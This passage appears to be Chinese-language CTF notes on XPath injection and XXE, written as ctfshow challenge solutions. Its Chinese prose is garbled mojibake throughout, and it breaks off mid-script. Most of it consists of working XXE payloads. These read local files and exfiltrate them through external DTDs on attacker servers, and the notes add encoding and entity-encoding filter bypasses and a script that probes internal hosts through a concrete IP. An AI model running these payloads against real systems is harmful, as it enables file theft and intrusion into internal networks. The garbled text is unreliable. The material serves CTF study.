æ³¨å…¥ä¸­ï¼Œä¸€ä¸ªâ€œ<code>ç”¨æˆ·</code>â€çš„æƒé™å¯èƒ½è¢«é™åˆ¶åˆ° æŸä¸€ç‰¹å®šçš„è¡¨ã€åˆ—æˆ–è€…æŸ¥è¯¢ã€‚<br>XPath æ³¨å…¥æ”»å‡»å¯ä»¥ä¿è¯å¾—åˆ°å®Œæ•´çš„ XML æ–‡æ¡£ï¼Œå³å®Œæ•´çš„æ•°æ®åº“ã€‚åªè¦ Web æœåŠ¡åº”ç”¨å…·æœ‰åŸºæœ¬çš„å®‰å…¨æ¼æ´ï¼Œå³å¯æ„é€ é’ˆå¯¹ XPath åº”ç”¨çš„è‡ªåŠ¨æ”»å‡»ã€‚</li></ol><p>å­¦ä¹  sql æ³¨å…¥æ—¶è¦å­¦ä¹ æ•°æ®åº“è¯­è¨€ï¼ŒåŒæ ·è¿™é‡Œè¦å­¦ä¹  XML çš„è¯­è¨€ XPtah</p><p><a href="https://www.freebuf.com/column/211251.html">https://www.freebuf.com/column/211251.html</a></p><p>åç»­è¡¥</p><h1 id="XXE-XML-å¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#XXE-XML-å¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="XXE(XML å¤–éƒ¨å®ä½“æ³¨å…¥)"></a>XXE(XML å¤–éƒ¨å®ä½“æ³¨å…¥)</h1><p>é€šè¿‡ XXE å¯ä»¥å®ç°æ•æ„Ÿæ–‡ä»¶è¯»å–ï¼ŒPHP RCE æ‰§è¡Œï¼Œå†…ç½‘æ¢æµ‹(å‘ç°ä¸»æœºï¼Œæ‰«æç«¯å£ï¼Œå†…ç½‘ç›²æ³¨ç­‰)ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæ‹’ç»æœåŠ¡æ”»å‡»</p><p>å®éªŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br></code></pre></td></tr></table></figure><ul><li><code>file_get_contents</code>è·å–å®¢æˆ·ç«¯è¾“å…¥å†…å®¹</li><li><code>new DOMDocument()</code>åˆå§‹åŒ– XML è§£æå™¨</li><li><code>loadXML($xmlfile)</code>åŠ è½½å®¢æˆ·ç«¯è¾“å…¥çš„ XML å†…å®¹</li><li><code>simplexml_import_dom($dom)</code>è·å– XML æ–‡æ¡£èŠ‚ç‚¹ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å› SimpleXMLElement å¯¹è±¡ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚</li></ul><p>å¼•å…¥å†…éƒ¨å®ä½“ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211204230757218.png"></p><ul><li>ctfshow373</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>è·å–è¾“å…¥ï¼Œåˆå§‹åŒ– XML è§£æå™¨ï¼ŒåŠ è½½å®¢æœç«¯è¾“å…¥çš„ XML å†…å®¹ï¼Œè·å–åˆ° XML æ–‡æ¡£èŠ‚ç‚¹ï¼Œå°† dom èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡å³ credsï¼Œè¾“å‡º creds ä¸­çš„å˜é‡ ctfshow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ctfshow374</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:2333/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p></blockquote><p>å¯ä»¥å…¬ç”¨ä¸€ä¸ªç«¯å£ï¼Œä¹Ÿå¯ä»¥åŒºåˆ†å¼€ï¼Œå¦‚ä¸‹</p><ul><li>ctfshow 375</li></ul><p>åœ¨ 374 çš„åŸºç¡€ä¸Šè¿›è¡Œè¿‡æ»¤</p><blockquote><p>if(preg_match(â€˜/&lt;?xml version=â€1.0â€/â€˜, $xmlfile)){ die(â€˜errorâ€™); }</p></blockquote><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:1234/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p><p>python3 -m http.server 1234</p></blockquote><ul><li>ctfshow 377</li></ul><p>è¿‡æ»¤äº† http åè®®ï¼Œç”¨ utf16 ç¼–ç ç»•è¿‡ï¼Œpython å‘åŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://d7a2ee70-cbf2-4e93-b189-e52a4c8dfee9.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span><br><span class="hljs-string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % aaa SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%aaa;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>requests.post(url ,data=payload)<br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨é…ç½® evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt; &quot;</span>&gt;</span><br>%dtd;<br>%xxe;<br></code></pre></td></tr></table></figure><ul><li>ctfshow378</li></ul><p>æ˜¯ xxe-lab çš„ php-xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file://flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>å½“æ–‡ä»¶å†…å®¹åŒ…å«å¤§é‡<code>&lt; &gt; &amp; &quot;</code>ç­‰ä¼šå‡ºç°æŠ¥é”™</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205152814834.png"></p><ul><li>æœåŠ¡ç«¯æœ‰å›æ˜¾</li></ul><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">roottag</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///å«&lt;&gt;&amp;&quot;</span>ç­‰çš„æ–‡ä»¶<span class="hljs-meta-string">&quot;&gt;</span></span></span></span><br><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta"><span class="xml">&lt;!ENTITY % end &quot;</span>]]&gt;</span>&quot;&gt;</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">%dtd; ]&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">æœ¬åœ°æµ‹è¯•ï¼š</span><br><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">end</span> <span class="hljs-meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/a.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">%dtd; ]&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;%start;%file;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205153830896.png"></p><ul><li>æœåŠ¡ç«¯æ— å›æ˜¾</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%remote;%int;%send;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:2333?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p>SVG æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE note [<br>&lt;!ENTITY file SYSTEM &quot;è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„&quot; &gt;<br>]&gt;<br>&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;<br>  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;<br>&lt;/svg&gt;<br></code></pre></td></tr></table></figure><p>æ•°æ®å¤–å¸¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!DOCTYPE root [<br>&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;<br>%remote;<br>]&gt;<br><br>shell.dtd<br>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://i/?flag=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>xxe ç»•è¿‡çš„ payload</p><p>å½“åªè¿‡æ»¤äº† SYSTEMï¼ŒPUBLIC ç­‰å…³é”®å­—æ—¶ï¼Œå¯ç”¨åŒé‡å®ä½“ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot;?&gt;<br><br>&lt;!DOCTYPE GVI [<br><br>    &lt;!ENTITY % XML &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;<br><br>    %XML;<br></code></pre></td></tr></table></figure><p>å³ä¸ºåœ¨ XML å®ä½“ä¸­å†å®šä¹‰ä¸€æ¬¡ XMLï¼Œå¯æˆåŠŸè¢«è§£æï¼Œæ”¯æŒ dtd æ•°æ®å¤–å¸¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;<br>&lt;core&gt;<br>      &lt;message&gt;&amp;xxe;&lt;/message&gt;<br>&lt;/core&gt;<br></code></pre></td></tr></table></figure><h2 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h2><p>ä¸»æœºå‘ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment">#Origtional XML that the server accepts</span><br><span class="hljs-comment">#&lt;xml&gt;</span><br><span class="hljs-comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="hljs-comment">#&lt;/xml&gt;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_xml</span>(<span class="hljs-params">string</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>    send_xml(xml)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_xml</span>(<span class="hljs-params">xml</span>):</span><br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    x = requests.post(<span class="hljs-string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>    coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>] <span class="hljs-comment"># a little split to get only the base64 encoded value</span><br>    <span class="hljs-built_in">print</span> coded_string<br><span class="hljs-comment">#   print base64.b64decode(coded_string)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    <span class="hljs-keyword">try</span>:<br>        i = <span class="hljs-built_in">str</span>(i)<br>        ip = <span class="hljs-string">&#x27;10.0.0.&#x27;</span> + i<br>        string = <span 